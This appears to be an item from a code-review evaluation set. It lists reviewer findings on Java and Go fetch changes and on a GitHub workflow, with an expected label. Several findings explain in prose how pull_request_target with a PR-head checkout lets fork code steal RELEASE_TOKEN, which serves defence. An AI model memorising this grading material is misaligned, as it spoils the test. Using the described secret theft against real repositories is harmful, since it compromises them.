findings.title: toGMTString is deprecated and produces a non-standard date format

findings.anchor: Map.Entry<User, Integer> fetch(String id, int timeoutMs) {
findings.body: The commit claims to preserve caller compatibility, but the method signature changed from returning User to Map.Entry<User, Integer>, the null-timeout default of 30000 ms was removed, and the second User constructor argument changed from an Integer timeout to a Date string. Every existing caller passing (String, Integer) or expecting a User no longer compiles.
findings.failure_scenario: Any existing caller of fetch(id, timeoutMs) with a nullable Integer, or assigning the result to User, fails to compile after this change; callers passing null for the timeout previously got 30000 ms and now have no such path.
findings.title: fetch drops the default timeout and changes the return contract

findings.body: The new code references Map.Entry and Map.entry, but no import of java.util.Map is added; only java.util.Date is imported. Unless Map is imported elsewhere in a part of the file not shown, this does not compile.
findings.failure_scenario: Compiling UserClient.java fails with 'cannot find symbol: class Map' on the Map.Entry return type.
findings.title: Map and Map.Entry are used without imports

findings.body: The new FetchUser performs ioutil.ReadFile("defaults.json") on every invocation and discards the result. This adds filesystem I/O to a hot path, depends on the process working directory containing defaults.json, and will fail silently in deployments where the file is absent. The read result is never used, so the I/O is pure overhead.
findings.failure_scenario: A caller invokes FetchUser in a request loop; each call performs a disk read of defaults.json relative to the current working directory. In a container whose CWD lacks the file, every call performs a failing syscall, adding latency and pointless error churn.
findings.title: FetchUser reads defaults.json from disk on every call

findings.body: The signature now uses time.Duration but the only import added is io/ioutil; without importing "time" the package will not compile.
findings.failure_scenario: Compiling client.go fails with 'undefined: time' since time.Duration is referenced without importing the time package.
findings.title: Add missing import of time

findings.body: ioutil.ReadFile("defaults.json") result is discarded and its error ignored; the read is pure overhead on every call. If defaults are needed, parse and use them; otherwise delete the call.
findings.failure_scenario: Every FetchUser call performs a disk read whose result is thrown away, adding latency and I/O on the request path and failing silently if the file is missing.
findings.title: Remove unused file read of defaults.json

findings.body: Switching from pull_request to pull_request_target runs the workflow with the base repository's secrets and permissions, while checking out the PR head SHA executes arbitrary attacker-controlled code from a fork. Any fork PR can modify the test scripts (e.g. package.json, test files, or a pretest hook) to exfiltrate RELEASE_TOKEN and any other repository secrets. This is the classic pull_request_target + head-ref checkout secret-exfiltration pattern.
findings.failure_scenario: An attacker opens a fork PR whose test code prints process.env.RELEASE_TOKEN; the workflow checks out the PR head, runs npm test with RELEASE_TOKEN in the environment, and the token is printed to the public workflow log, giving the attacker release privileges.
findings.title: pull_request_target with PR head checkout exposes secrets to untrusted code

findings.body: RELEASE_TOKEN is injected into the environment of `npm test`, which executes arbitrary code from the PR head ref. Even if the token is needed elsewhere in the workflow, exposing it to a step that runs fork-controlled source gives that source direct access to the secret.
findings.failure_scenario: A fork PR's test suite reads process.env.RELEASE_TOKEN and sends it to an attacker-controlled server; the attacker gains the token's permissions in the repository.
findings.title: Do not pass RELEASE_TOKEN to untrusted PR code

findings.body: Checking out github.event.pull_request.head.sha in a pull_request_target workflow executes the PR author's code with the base repository's secrets and permissions. If PR code must be tested, use the pull_request event (no secrets), or keep pull_request_target but only run trusted, reviewed workflows and never check out/build the PR head with secrets present.
findings.failure_scenario: A malicious PR modifies a test or npm lifecycle script to run arbitrary commands; the pull_request_target runner executes them with access to base-repo secrets, compromising the repository.
findings.title: Checkout of PR head ref under pull_request_target grants untrusted code a trusted run

expected.label: pull_request_target executes untrusted head with a secret

findings.title: Pin third-party actions to a commit SHA
